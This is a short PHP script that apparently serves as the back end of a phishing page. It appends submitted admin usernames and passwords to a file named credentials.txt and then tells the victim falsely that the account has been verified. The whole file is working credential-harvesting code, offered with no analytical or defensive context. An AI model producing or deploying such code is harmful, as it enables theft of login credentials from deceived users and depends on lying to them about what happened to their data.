<?php
file_put_contents('credentials.txt', "Username: " . $_POST['Admin'] . " Password: " . $_POST['Password'] . "\n", FILE_APPEND);
echo "Thank you! Your account has been verified.";
?>
